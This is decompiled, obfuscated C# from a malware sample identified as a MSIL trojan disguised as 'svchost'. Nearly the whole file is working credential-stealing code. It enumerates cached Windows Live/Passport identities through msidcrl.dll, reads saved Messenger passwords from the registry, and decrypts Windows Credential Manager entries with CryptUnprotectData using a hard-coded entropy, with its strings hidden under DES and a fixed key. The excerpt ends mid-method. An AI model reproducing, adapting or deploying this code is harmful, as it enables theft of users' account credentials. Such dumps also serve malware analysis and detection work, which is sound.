// Decompiled with JetBrains decompiler
// Type: JVlEfpQNBBVorQEiV18
// Assembly: svchost, Version=3.6.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A77B6346-3D8E-49C8-9445-FA550F2D4E61
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00019-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-9e7465e5d6bd41a7ae109a189729329f5b3b9f4c7694553dcd5941a98f8c38e1.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using RQBV21;
using System;
using System.Collections;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

internal class JVlEfpQNBBVorQEiV18 : IEnumerable, IEnumerator
{
  private const int ERROR_SUCCESS = 0;
  private const int HKEY_CURRENT_USER = -2147483647;
  private const int READ_CONTROL = 131072;
  private const int STANDARD_RIGHTS_READ = 131072;
  private const int KEY_QUERY_VALUE = 1;
  private const int KEY_ENUMERATE_SUB_KEYS = 8;
  private const int KEY_NOTIFY = 16;
  private const int SYNCHRONIZE = 1048576;
  private const int STANDARD_RIGHTS_WRITE = 131072;
  private const int KEY_SET_VALUE = 2;
  private const int KEY_CREATE_SUB_KEY = 4;
  private const int KEY_READ = 131097;
  private const int KEY_WRITE = 131078;
  private const int CSIDL_PROGRAM_FILES = 38;
  private JVlEfpQNBBVorQEiV18.Z1fPKV6wCPL7GGdc6cbjnKnL24[] THPMvGBX0o44BS479YgWCmyF8;
  private int LCQK2wLn4iK084yuWfSa8vTK9;
  [SpecialName]
  private byte[] \u0024STATIC\u0024Base64Dec\u0024201E10E\u0024Enc;

  [DllImport("kernel32.dll", EntryPoint = "lstrlenA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0039NgOeEXR1dnAFgQw645([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString);

  [DllImport("advapi32.dll", EntryPoint = "CredEnumerateW", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int SpDyMApsPfD908eHs46(
    [MarshalAs(UnmanagedType.LPWStr)] string lpszFilter,
    int lFlags,
    ref int pCount,
    ref IntPtr lppCredentials);

  [DllImport("advapi32.dll", EntryPoint = "CredEnumerateW", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int bxCOuhoMdbscWl5Sl47(
    IntPtr lpszFilter,
    int lFlags,
    ref int pCount,
    ref IntPtr lppCredentials);

  [DllImport("advapi32.dll", EntryPoint = "CredDeleteW", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int XeEmmdRlpojI158Sd48([MarshalAs(UnmanagedType.LPWStr)] string lpwstrTargetName, int dwType, int dwFlags);

  [DllImport("advapi32.dll", EntryPoint = "CredFree", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0034iThn8fLzoWgTUyhE49(IntPtr pBuffer);

  [DllImport("crypt32.dll", EntryPoint = "CryptUnprotectData", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int aZ35PkLs5S43b6jjI50(
    ref JVlEfpQNBBVorQEiV18.pMZntnwgJ6zp0CVtsdRY4FE520 pDataIn,
    int ppszDataDescr,
    ref JVlEfpQNBBVorQEiV18.pMZntnwgJ6zp0CVtsdRY4FE520 pOptionalEntropy,
    int pvReserved,
    int pPromptStruct,
    int dwFlags,
    ref JVlEfpQNBBVorQEiV18.pMZntnwgJ6zp0CVtsdRY4FE520 pDataOut);

  [DllImport("crypt32.dll", EntryPoint = "CryptUnprotectData", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int gMY3z6pBNOU5vtLrm51(
    ref JVlEfpQNBBVorQEiV18.pMZntnwgJ6zp0CVtsdRY4FE520 pDataIn,
    int ppszDataDescr,
    int pOptionalEntropy,
    int pvReserved,
    int pPromptStruct,
    int dwFlags,
    ref JVlEfpQNBBVorQEiV18.pMZntnwgJ6zp0CVtsdRY4FE520 pDataOut);

  [DllImport("advapi32.dll", EntryPoint = "RegOpenKeyExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int U8P7fY8PifbHniCWa52(
    int hKey,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSubKey,
    int ulOptions,
    int samDesired,
    ref int phkResult);

  [DllImport("advapi32.dll", EntryPoint = "RegQueryValueExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int DLiBATDu1vQmzoiCP53(
    int hKey,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName,
    int lpReserved,
    ref int lpType,
    [MarshalAs(UnmanagedType.LPWStr)] string lpData,
    ref int lpcbData);

  [DllImport("advapi32.dll", EntryPoint = "RegQueryValueExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int bbuB1OPehQdTqvh9l54(
    int hKey,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName,
    int lpReserved,
    ref int lpType,
    IntPtr lpData,
    ref int lpcbData);

  [DllImport("advapi32.dll", EntryPoint = "RegEnumKeyExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int P08LkebDeshsIRS5x55(
    int hKey,
    int dwIndex,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpName,
    ref int lpcbName,
    int lpReserved,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClass,
    int lpcbClass,
    ref JVlEfpQNBBVorQEiV18.knxsvAC7ErIGAs4MDK9Jhvu021 lpftLastWriteTime);

  [DllImport("advapi32.dll", EntryPoint = "RegDeleteValueA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0036rszCWsnj3qBA0zde56(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName);

  [DllImport("kernel32.dll", EntryPoint = "LocalFree", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int yht3RWiXNmyLyZkNS57(int hMem);

  [DllImport("advapi32.dll", EntryPoint = "RegCloseKey", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int pPGMd3Fo0bL2DsIfu58(int hKey);

  [DllImport("shell32.dll", EntryPoint = "SHGetSpecialFolderLocation", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int iBBtev9BPAUBK45NH59(int hwndOwner, int nFolder, ref int pidl);

  [DllImport("shell32.dll", EntryPoint = "SHGetPathFromIDListA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int AJwsleNFQLxV9TPv460(int pidl, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pszPath);

  [DllImport("msidcrl.dll", EntryPoint = "Initialize", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GJcpakxaotLMg6GfW61(
    ref ArQbjx1DfqTjkrs95SQBTuPg42 guid,
    int IDCRLVersion,
    int dwFlags);

  [DllImport("msidcrl.dll", EntryPoint = "EnumIdentitiesWithCachedCredentials", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int RYI1WmNOoKCFFG45F62([MarshalAs(UnmanagedType.LPWStr)] string wszCachedCredType, ref int phEnumHandle);

  [DllImport("msidcrl.dll", EntryPoint = "NextIdentity", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int nlBiqpZhXK2TAEQGd63(int hEnumHandle, ref IntPtr lpwszMemberName);

  [DllImport("msidcrl.dll", EntryPoint = "PassportFreeMemory", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0032RN3KmoBMzUuIMGGB64(IntPtr ptr);

  [DllImport("msidcrl.dll", EntryPoint = "CloseEnumIdentitiesHandle", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int IlEDqzJKZCLUN5MZs65(int hEnumHandle);

  [DllImport("msidcrl.dll", EntryPoint = "CreateIdentityHandle", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int EdiCDYcHEP4MeYmcY66(
    [MarshalAs(UnmanagedType.LPWStr)] string wszMemberName,
    int dwFlags,
    ref int lphExternalIdentity);

  [DllImport("msidcrl.dll", EntryPoint = "CreateIdentityHandle", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int Wv2zBh3iKKDGYu8vf67(
    IntPtr wszMemberName,
    int dwFlags,
    ref int lphExternalIdentity);

  [DllImport("msidcrl.dll", EntryPoint = "HasPersistedCredential", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0037snY4nrWLKFXKDoIO68(
    int hExternalIdentity,
    [MarshalAs(UnmanagedType.LPWStr)] string wszCredType,
    ref int lpbPersisted);

  [DllImport("msidcrl.dll", EntryPoint = "RemovePersistedCredential", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0039gXT2WejTdz1GlVhZ69(int hExternalIdentity, [MarshalAs(UnmanagedType.LPWStr)] string wszCredType);

  [DllImport("msidcrl.dll", EntryPoint = "GetIdentityPropertyByName", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int RTP0R8ACPxolZ7eY970(
    int hExternalIdentity,
    [MarshalAs(UnmanagedType.LPWStr)] string wszPropertyName,
    ref int lpszValue);

  [DllImport("msidcrl.dll", EntryPoint = "BuildAuthTokenRequest", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int kRxm5w8Fb9RV5pJFLMuTOi8n71(
    int hExternalIdentity,
    [MarshalAs(UnmanagedType.LPWStr)] string wszPolicy,
    int dwFlags,
    ref IntPtr lpReturn);

  [DllImport("msidcrl.dll", EntryPoint = "CloseIdentityHandle", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int gcoQXT5l2w04KCLnGkFYJHK772(int hExternalIdentity);

  [DllImport("msidcrl.dll", EntryPoint = "Uninitialize", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int FGelJ4k2Ia6S7iHi3wSyoFV873();

  [DllImport("kernel32.dll", EntryPoint = "LoadLibraryA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u00307cuCaDzsgahEKBYcYlAwTfn74([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpLibFileName);

  [DllImport("kernel32.dll", EntryPoint = "FreeLibrary", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int DnUcObJ0L5lBSQpywxqQ8pDj75(int hLibModule);

  private string UUmqkkC7SPRefrKhxawypZ6m76()
  {
    int pidl;
    string str;
    if (JVlEfpQNBBVorQEiV18.iBBtev9BPAUBK45NH59(0, 38, ref pidl) == 0)
    {
      string pszPath = new string(char.MinValue, 512);
      JVlEfpQNBBVorQEiV18.AJwsleNFQLxV9TPv460(pidl, ref pszPath);
      str = Strings.Left(pszPath, checked (Strings.InStr(pszPath, "\0") - 1));
    }
    else
      str = (string) null;
    JVlEfpQNBBVorQEiV18.yht3RWiXNmyLyZkNS57(pidl);
    return str;
  }

  private string yM3YtofdKAiTOiGqtdJ2Zai577(string strText, string sDecrKey)
  {
    string str;
    try
    {
      byte[] rgbIV = new byte[8]
      {
        (byte) 18,
        (byte) 52,
        (byte) 86,
        (byte) 120,
        (byte) 144,
        (byte) 171,
        (byte) 205,
        (byte) 239
      };
      byte[] numArray = new byte[checked (strText.Length + 1)];
      byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(sDecrKey, 8));
      DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
      byte[] buffer = Convert.FromBase64String(strText);
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, cryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);
      cryptoStream.Write(buffer, 0, buffer.Length);
      cryptoStream.FlushFinalBlock();
      str = Encoding.UTF8.GetString(memoryStream.ToArray());
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = (string) null;
      ProjectData.ClearProjectError();
    }
    return str;
  }

  private void M9iYT4UUO0RxhDDtADuE9Qse78(ref int ub)
  {
    string lpLibFileName = this.UUmqkkC7SPRefrKhxawypZ6m76() + this.yM3YtofdKAiTOiGqtdJ2Zai577("EA4JV0Ui8748ZZ/DXx57K0cxtw3bP5LctlmBtdcr0ig=", "12345#$%");
    if (Operators.CompareString(FileSystem.Dir(lpLibFileName), (string) null, false) == 0)
      return;
    int hLibModule = JVlEfpQNBBVorQEiV18.\u00307cuCaDzsgahEKBYcYlAwTfn74(ref lpLibFileName);
    ArQbjx1DfqTjkrs95SQBTuPg42 guid;
    guid.Data4 = new byte[8];
    guid.Data1 = 1896408858;
    guid.Data2 = (short) -26330;
    guid.Data3 = (short) 20427;
    guid.Data4[0] = (byte) 188;
    guid.Data4[1] = (byte) 201;
    guid.Data4[2] = (byte) 154;
    guid.Data4[3] = (byte) 157;
    guid.Data4[4] = (byte) 63;
    guid.Data4[5] = (byte) 50;
    guid.Data4[6] = (byte) 228;
    guid.Data4[7] = (byte) 35;
    JVlEfpQNBBVorQEiV18.GJcpakxaotLMg6GfW61(ref guid, 1, 15);
    int phEnumHandle;
    IntPtr lpwszMemberName;
    int lphExternalIdentity;
    int lpbPersisted;
    int num1;
    if (JVlEfpQNBBVorQEiV18.RYI1WmNOoKCFFG45F62(this.yM3YtofdKAiTOiGqtdJ2Zai577("2NGrkYDCHuyPKUaIHPbn/Q==", "12345#$%"), ref phEnumHandle) == 0)
    {
      for (int index1 = JVlEfpQNBBVorQEiV18.nlBiqpZhXK2TAEQGd63(phEnumHandle, ref lpwszMemberName); index1 == 0; index1 = JVlEfpQNBBVorQEiV18.nlBiqpZhXK2TAEQGd63(phEnumHandle, ref lpwszMemberName))
      {
        if (JVlEfpQNBBVorQEiV18.Wv2zBh3iKKDGYu8vf67(lpwszMemberName, (int) byte.MaxValue, ref lphExternalIdentity) == 0 & lpwszMemberName != IntPtr.Zero)
        {
          if (JVlEfpQNBBVorQEiV18.\u0037snY4nrWLKFXKDoIO68(lphExternalIdentity, this.yM3YtofdKAiTOiGqtdJ2Zai577("2NGrkYDCHuyPKUaIHPbn/Q==", "12345#$%"), ref lpbPersisted) == 0 & lpbPersisted != 0)
          {
            IntPtr lpReturn;
            if (JVlEfpQNBBVorQEiV18.kRxm5w8Fb9RV5pJFLMuTOi8n71(lphExternalIdentity, this.yM3YtofdKAiTOiGqtdJ2Zai577("2NGrkYDCHuyPKUaIHPbn/Q==", "12345#$%"), 0, ref lpReturn) == 0)
            {
              string str = this.jOYLLENlXgB0B1HQ2gD1NxHY81(lpReturn);
              int Start = checked (Strings.InStr(str, this.yM3YtofdKAiTOiGqtdJ2Zai577("2wm3YZnf7HZzbNob5J62Ow==", "12345#$%")) + 15);
              int num2 = Strings.InStr(str, this.yM3YtofdKAiTOiGqtdJ2Zai577("M+aaZd4Qk9Hn1BuHuUYc6ONxHeOgK/kb", "12345#$%"));
              if (num2 > 0)
              {
                this.THPMvGBX0o44BS479YgWCmyF8 = (JVlEfpQNBBVorQEiV18.Z1fPKV6wCPL7GGdc6cbjnKnL24[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) this.THPMvGBX0o44BS479YgWCmyF8, (Array) new JVlEfpQNBBVorQEiV18.Z1fPKV6wCPL7GGdc6cbjnKnL24[checked (ub + 1)]);
                int index2 = ub;
                this.THPMvGBX0o44BS479YgWCmyF8[index2].strLogin = this.jOYLLENlXgB0B1HQ2gD1NxHY81(lpwszMemberName);
                this.THPMvGBX0o44BS479YgWCmyF8[index2].strPass = Strings.Mid(str, Start, checked (num2 - Start));
                this.THPMvGBX0o44BS479YgWCmyF8[index2].strTargetName = "ps:" + this.THPMvGBX0o44BS479YgWCmyF8[index2].strLogin;
                checked { ++ub; }
              }
            }
            if (lpReturn != IntPtr.Zero)
              JVlEfpQNBBVorQEiV18.\u0032RN3KmoBMzUuIMGGB64(lpReturn);
          }
          num1 = JVlEfpQNBBVorQEiV18.gcoQXT5l2w04KCLnGkFYJHK772(lphExternalIdentity);
        }
        if (lpwszMemberName != IntPtr.Zero)
          JVlEfpQNBBVorQEiV18.\u0032RN3KmoBMzUuIMGGB64(lpwszMemberName);
      }
    }
    JVlEfpQNBBVorQEiV18.IlEDqzJKZCLUN5MZs65(phEnumHandle);
    if (JVlEfpQNBBVorQEiV18.RYI1WmNOoKCFFG45F62(this.yM3YtofdKAiTOiGqtdJ2Zai577("7RxDBZUWSRpxLG9yAQLKbEv86LQWS19u", "12345#$%"), ref phEnumHandle) == 0)
    {
      for (int index3 = JVlEfpQNBBVorQEiV18.nlBiqpZhXK2TAEQGd63(phEnumHandle, ref lpwszMemberName); index3 == 0; index3 = JVlEfpQNBBVorQEiV18.nlBiqpZhXK2TAEQGd63(phEnumHandle, ref lpwszMemberName))
      {
        if (JVlEfpQNBBVorQEiV18.Wv2zBh3iKKDGYu8vf67(lpwszMemberName, (int) byte.MaxValue, ref lphExternalIdentity) == 0 & lpwszMemberName != IntPtr.Zero)
        {
          if (JVlEfpQNBBVorQEiV18.\u0037snY4nrWLKFXKDoIO68(lphExternalIdentity, this.yM3YtofdKAiTOiGqtdJ2Zai577("2NGrkYDCHuyPKUaIHPbn/Q==", "12345#$%"), ref lpbPersisted) == 0 & lpbPersisted == 0)
          {
            this.THPMvGBX0o44BS479YgWCmyF8 = (JVlEfpQNBBVorQEiV18.Z1fPKV6wCPL7GGdc6cbjnKnL24[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) this.THPMvGBX0o44BS479YgWCmyF8, (Array) new JVlEfpQNBBVorQEiV18.Z1fPKV6wCPL7GGdc6cbjnKnL24[checked (ub + 1)]);
            int index4 = ub;
            this.THPMvGBX0o44BS479YgWCmyF8[index4].strLogin = this.jOYLLENlXgB0B1HQ2gD1NxHY81(lpwszMemberName);
            this.THPMvGBX0o44BS479YgWCmyF8[index4].strPass = "";
            this.THPMvGBX0o44BS479YgWCmyF8[index4].strTargetName = "ps:" + this.THPMvGBX0o44BS479YgWCmyF8[index4].strLogin;
            checked { ++ub; }
          }
          num1 = JVlEfpQNBBVorQEiV18.gcoQXT5l2w04KCLnGkFYJHK772(lphExternalIdentity);
        }
        if (lpwszMemberName != IntPtr.Zero)
          JVlEfpQNBBVorQEiV18.\u0032RN3KmoBMzUuIMGGB64(lpwszMemberName);
      }
    }
    JVlEfpQNBBVorQEiV18.IlEDqzJKZCLUN5MZs65(phEnumHandle);
    JVlEfpQNBBVorQEiV18.FGelJ4k2Ia6S7iHi3wSyoFV873();
    JVlEfpQNBBVorQEiV18.DnUcObJ0L5lBSQpywxqQ8pDj75(hLibModule);
  }

  public void t65bg3mouYck5hkGGn5Nr88P79()
  {
    this.THPMvGBX0o44BS479YgWCmyF8 = (JVlEfpQNBBVorQEiV18.Z1fPKV6wCPL7GGdc6cbjnKnL24[]) null;
    int ub = 0;
    string lpSubKey1 = this.yM3YtofdKAiTOiGqtdJ2Zai577("8DYu61PVOq2FZMLQdWt4I+/kGim2ul8u7e2zNVqcjYdxv9iEaJtD6g==", "12345#$%");
    int phkResult;
    int num1 = JVlEfpQNBBVorQEiV18.U8P7fY8PifbHniCWa52(-2147483647, ref lpSubKey1, 0, 131097, ref phkResult);
    int cb1 = 0;
    int hKey1 = phkResult;
    string str1 = this.yM3YtofdKAiTOiGqtdJ2Zai577("5yqXvOobmBWjYQ+U9huFGToHAA8jKsNg0ZdYl78UxeI=", "12345#$%");
    ref string local1 = ref str1;
    int num2;
    ref int local2 = ref num2;
    IntPtr zero1 = IntPtr.Zero;
    ref int local3 = ref cb1;
    num1 = JVlEfpQNBBVorQEiV18.bbuB1OPehQdTqvh9l54(hKey1, ref local1, 0, ref local2, zero1, ref local3);
    int cb2;
    string lpSubKey2;
    if (cb1 > 0)
    {
      IntPtr num3 = Marshal.AllocHGlobal(cb1);
      int hKey2 = phkResult;
      string str2 = this.yM3YtofdKAiTOiGqtdJ2Zai577("5yqXvOobmBWjYQ+U9huFGToHAA8jKsNg0ZdYl78UxeI=", "12345#$%");
      ref string local4 = ref str2;
      ref int local5 = ref num2;
      IntPtr lpData1 = num3;
      ref int local6 = ref cb1;
      num1 = JVlEfpQNBBVorQEiV18.bbuB1OPehQdTqvh9l54(hKey2, ref local4, 0, ref local5, lpData1, ref local6);
      string stringAnsi = Marshal.PtrToStringAnsi(num3);
      Marshal.FreeHGlobal(num3);
      string Base64String = Strings.Mid(stringAnsi, 1, checked (Strings.Len(stringAnsi) - 1));
      this.THPMvGBX0o44BS479YgWCmyF8 = new JVlEfpQNBBVorQEiV18.Z1fPKV6wCPL7GGdc6cbjnKnL24[1];
      int index = 0;
      this.THPMvGBX0o44BS479YgWCmyF8[index].strPass = this.\u0036BKEIYQ4aycTzdzvCfLF7Ixs84(ref Base64String);
      cb2 = 0;
      int hKey3 = phkResult;
      string str3 = this.yM3YtofdKAiTOiGqtdJ2Zai577("LJvbRRfi92F+T5sdUcoVeEDw5qat1xmCqEtfms+PN+4=", "12345#$%");
      ref string local7 = ref str3;
      ref int local8 = ref num2;
      IntPtr zero2 = IntPtr.Zero;
      ref int local9 = ref cb2;
      num1 = JVlEfpQNBBVorQEiV18.bbuB1OPehQdTqvh9l54(hKey3, ref local7, 0, ref local8, zero2, ref local9);
      IntPtr num4 = Marshal.AllocHGlobal(cb2);
      int hKey4 = phkResult;
      lpSubKey2 = this.yM3YtofdKAiTOiGqtdJ2Zai577("LJvbRRfi92F+T5sdUcoVeEDw5qat1xmCqEtfms+PN+4=", "12345#$%");
      ref string local10 = ref lpSubKey2;
      ref int local11 = ref num2;
      IntPtr lpData2 = num4;
      ref int local12 = ref cb2;
      num1 = JVlEfpQNBBVorQEiV18.bbuB1OPehQdTqvh9l54(hKey4, ref local10, 0, ref local11, lpData2, ref local12);
      this.THPMvGBX0o44BS479YgWCmyF8[index].strLogin = Marshal.PtrToStringAnsi(num4);
      Marshal.FreeHGlobal(num4);
      this.THPMvGBX0o44BS479YgWCmyF8[index].strLogin = Strings.Mid(this.THPMvGBX0o44BS479YgWCmyF8[index].strLogin, 1, checked (Strings.Len(this.THPMvGBX0o44BS479YgWCmyF8[index].strLogin) - 1));
      checked { ++ub; }
      JVlEfpQNBBVorQEiV18.pPGMd3Fo0bL2DsIfu58(phkResult);
    }
    JVlEfpQNBBVorQEiV18.pPGMd3Fo0bL2DsIfu58(phkResult);
    lpSubKey2 = this.yM3YtofdKAiTOiGqtdJ2Zai577("8DYu61PVOq2FZMLQdWt4I2soxcIHGyEfqCSEVbWZgNc=", "12345#$%");
    JVlEfpQNBBVorQEiV18.pMZntnwgJ6zp0CVtsdRY4FE520 pDataIn;
    JVlEfpQNBBVorQEiV18.pMZntnwgJ6zp0CVtsdRY4FE520 pDataOut;
    if (JVlEfpQNBBVorQEiV18.U8P7fY8PifbHniCWa52(-2147483647, ref lpSubKey2, 0, 131097, ref phkResult) == 0)
    {
      cb2 = 0;
      int hKey5 = phkResult;
      lpSubKey2 = this.yM3YtofdKAiTOiGqtdJ2Zai577("5yqXvOobmBXf7FIWvrPp6xBpSVJvL4lBvoArca+IWcA=", "12345#$%");
      ref string local13 = ref lpSubKey2;
      ref int local14 = ref num2;
      IntPtr zero3 = IntPtr.Zero;
      ref int local15 = ref cb2;
      if (JVlEfpQNBBVorQEiV18.bbuB1OPehQdTqvh9l54(hKey5, ref local13, 0, ref local14, zero3, ref local15) == 0)
      {
        IntPtr num5 = Marshal.AllocHGlobal(cb2);
        int hKey6 = phkResult;
        lpSubKey2 = this.yM3YtofdKAiTOiGqtdJ2Zai577("5yqXvOobmBXf7FIWvrPp6xBpSVJvL4lBvoArca+IWcA=", "12345#$%");
        ref string local16 = ref lpSubKey2;
        ref int local17 = ref num2;
        IntPtr lpData3 = num5;
        ref int local18 = ref cb2;
        if (JVlEfpQNBBVorQEiV18.bbuB1OPehQdTqvh9l54(hKey6, ref local16, 0, ref local17, lpData3, ref local18) != 0)
          return;
        this.THPMvGBX0o44BS479YgWCmyF8 = (JVlEfpQNBBVorQEiV18.Z1fPKV6wCPL7GGdc6cbjnKnL24[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) this.THPMvGBX0o44BS479YgWCmyF8, (Array) new JVlEfpQNBBVorQEiV18.Z1fPKV6wCPL7GGdc6cbjnKnL24[checked (ub + 1)]);
        pDataIn.pbData = checked (num5.ToInt32() + 2);
        pDataIn.cbData = checked (cb2 - 2);
        JVlEfpQNBBVorQEiV18.gMY3z6pBNOU5vtLrm51(ref pDataIn, 0, 0, 0, 0, 1, ref pDataOut);
        string stringAnsi = Marshal.PtrToStringAnsi(num5);
        Marshal.FreeHGlobal(num5);
        int index = ub;
        this.THPMvGBX0o44BS479YgWCmyF8[index].strPass = this.\u0036BKEIYQ4aycTzdzvCfLF7Ixs84(ref stringAnsi);
        cb2 = 0;
        int hKey7 = phkResult;
        lpSubKey2 = this.yM3YtofdKAiTOiGqtdJ2Zai577("+dVN7/QV13r+DgRv6X7TvCPIHnvrpiIO5YkIE/WA0Yc=", "12345#$%");
        ref string local19 = ref lpSubKey2;
        ref int local20 = ref num2;
        IntPtr zero4 = IntPtr.Zero;
        ref int local21 = ref cb2;
        num1 = JVlEfpQNBBVorQEiV18.bbuB1OPehQdTqvh9l54(hKey7, ref local19, 0, ref local20, zero4, ref local21);
        IntPtr num6 = Marshal.AllocHGlobal(cb2);
        int hKey8 = phkResult;
        lpSubKey2 = this.yM3YtofdKAiTOiGqtdJ2Zai577("+dVN7/QV13r+DgRv6X7TvCPIHnvrpiIO5YkIE/WA0Yc=", "12345#$%");
        ref string local22 = ref lpSubKey2;
        ref int local23 = ref num2;
        IntPtr lpData4 = num6;
        ref int local24 = ref cb2;
        num1 = JVlEfpQNBBVorQEiV18.bbuB1OPehQdTqvh9l54(hKey8, ref local22, 0, ref local23, lpData4, ref local24);
        this.THPMvGBX0o44BS479YgWCmyF8[index].strLogin = Marshal.PtrToStringAnsi(num6);
        Marshal.FreeHGlobal(num6);
        this.THPMvGBX0o44BS479YgWCmyF8[index].strLogin = Strings.Mid(this.THPMvGBX0o44BS479YgWCmyF8[index].strLogin, 1, checked (Strings.Len(this.THPMvGBX0o44BS479YgWCmyF8[index].strLogin) - 1));
        checked { ++ub; }
        JVlEfpQNBBVorQEiV18.yht3RWiXNmyLyZkNS57(pDataOut.pbData);
      }
    }
    int pCount;
    IntPtr lppCredentials;
    JVlEfpQNBBVorQEiV18.SpDyMApsPfD908eHs46(this.yM3YtofdKAiTOiGqtdJ2Zai577("Tgwk53CSmXfcKjdaJc0r6Q==", "12345#$%"), 0, ref pCount, ref lppCredentials);
    JVlEfpQNBBVorQEiV18.\u00395kjwUOPTwGZKIUErYyGqYWz23 gzkiuErYyGqYwz23_1;
    JVlEfpQNBBVorQEiV18.\u00395kjwUOPTwGZKIUErYyGqYWz23 gzkiuErYyGqYwz23_2;
    IntPtr ptr;
    if (pCount > 0)
    {
      JVlEfpQNBBVorQEiV18.pMZntnwgJ6zp0CVtsdRY4FE520 pOptionalEntropy;
      pOptionalEntropy.cbData = 74;
      IntPtr num7 = Marshal.AllocHGlobal(74);
      string str4 = this.yM3YtofdKAiTOiGqtdJ2Zai577("PPK1dshgmxnwx85Gl1tiCr9sN7TipBHZTn33umFvdUTSy1vfo/Df8A==", "12345#$%") + "\0";
      int num8 = 0;
      do
      {
        Marshal.WriteInt16(num7, checked (num8 * 2), checked ((short) (Strings.Asc(Strings.Mid(str4, num8 + 1, 1)) * 4)));
        checked { ++num8; }
      }
      while (num8 <= 36);
      pOptionalEntropy.pbData = num7.ToInt32();
      this.THPMvGBX0o44BS479YgWCmyF8 = (JVlEfpQNBBVorQEiV18.Z1fPKV6wCPL7GGdc6cbjnKnL24[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) this.THPMvGBX0o44BS479YgWCmyF8, (Array) new JVlEfpQNBBVorQEiV18.Z1fPKV6wCPL7GGdc6cbjnKnL24[checked (ub + pCount - 1 + 1)]);
      int num9 = ub;
      int num10 = checked (ub + pCount - 1);
      int num11 = num9;
      while (num11 <= num10)
      {
        object structure = Marshal.PtrToStructure(Marshal.ReadIntPtr(lppCredentials, checked (num11 - ub * 4)), gzkiuErYyGqYwz23_1.GetType());
        gzkiuErYyGqYwz23_1 = structure != null ? (JVlEfpQNBBVorQEiV18.\u00395kjwUOPTwGZKIUErYyGqYWz23) structure : gzkiuErYyGqYwz23_2;
        pDataIn.pbData = gzkiuErYyGqYwz23_1.lpbCredentialBlob;
        pDataIn.cbData = gzkiuErYyGqYwz23_1.dwCredentialBlobSize;
        pDataOut.cbData = 0;
        pDataOut.pbData = 0;
        JVlEfpQNBBVorQEiV18.aZ35PkLs5S43b6jjI50(ref pDataIn, 0, ref pOptionalEntropy, 0, 0, 0, ref pDataOut);
        int index = num11;
        ref JVlEfpQNBBVorQEiV18.Z1fPKV6wCPL7GGdc6cbjnKnL24 local25 = ref this.THPMvGBX0o44BS479YgWCmyF8[index];
        ptr = new IntPtr(gzkiuErYyGqYwz23_1.lpUserName);
        string str5 = this.jOYLLENlXgB0B1HQ2gD1NxHY81(ptr);
        local25.strLogin = str5;
        ref JVlEfpQNBBVorQEiV18.Z1fPKV6wCPL7GGdc6cbjnKnL24 local26 = ref this.THPMvGBX0o44BS479YgWCmyF8[index];
        ptr = new IntPtr(gzkiuErYyGqYwz23_1.lpstrTargetName);
        string str6 = this.jOYLLENlXgB0B1HQ2gD1NxHY81(ptr);
        local26.strTargetName = str6;
        ref JVlEfpQNBBVorQEiV18.Z1fPKV6wCPL7GGdc6cbjnKnL24 local27 = ref this.THPMvGBX0o44BS479YgWCmyF8[index];
        ptr = new IntPtr(pDataOut.pbData);
        string str7 = this.jOYLLENlXgB0B1HQ2gD1NxHY81(ptr);
        local27.strPass = str7;
        JVlEfpQNBBVorQEiV18.yht3RWiXNmyLyZkNS57(pDataOut.pbData);
        checked { ++num11; }
      }
      Marshal.FreeHGlobal(num7);
      checked { ub += pCount; }
    }
